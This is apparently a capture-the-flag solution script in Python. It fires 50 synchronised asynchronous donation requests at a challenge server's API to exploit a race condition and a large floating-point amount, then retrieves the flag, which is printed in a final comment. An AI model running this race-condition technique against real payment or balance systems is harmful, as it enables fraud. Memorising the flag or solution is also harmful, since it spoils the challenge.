import aiohttp
import asyncio
import time


BASE_URL = "http://34.130.180.82:52792"
DONATE_URL = f"{BASE_URL}/api/donate"


# create payloads ahead of time to make things a bit faster
codetiger = dict()
codetiger["fund"] = "codetigerorz"
codetiger["amount"] = 90071992547409.91

flag_payload = dict()
flag_payload["fund"] = "flag"
flag_payload["amount"] = 0.5

async def donate_to_codetiger(session, idx: int):
    while time.time() < trigger_time:  # make sure the requests start at the same time
        await asyncio.sleep(0.0001)
    async with session.post(url=DONATE_URL, json=codetiger) as response:
        resp = await response.read()
        if "not enough money in account" not in resp.decode() or idx < 0:
            print(idx, resp.decode())


async def donate_to_flag(session, idx: int):
    while time.time() < trigger_time:  # make sure the requests start at the same time
        await asyncio.sleep(0.0001)
    async with session.post(url=DONATE_URL, json=flag_payload) as response:
        resp = await response.read()
        if "not enough money in account" not in resp.decode() or idx < 0:
            print(idx, resp.decode())


async def get_balance(session):
    async with session.get(url=f"{BASE_URL}/api/balance") as response:
        resp = await response.read()
        print(resp.decode())


async def main():
    async with aiohttp.ClientSession() as session:
        await get_balance(session)
        time.sleep(0.1)

        global trigger_time
        trigger_time = time.time() + 0.5

        await asyncio.gather(*[
            donate_to_codetiger(session, i)
            for i in range(50)])  # one or two of the requests should create a race condition for the `uses` variable
        time.sleep(0.1)
        await get_balance(session)

        await donate_to_flag(session, -1)  # get the flag


if __name__ == '__main__':
    asyncio.run(main())

# LITCTF{Emerald_Block_super_orz_and_no_Emerald_did_not_make_this_flag}
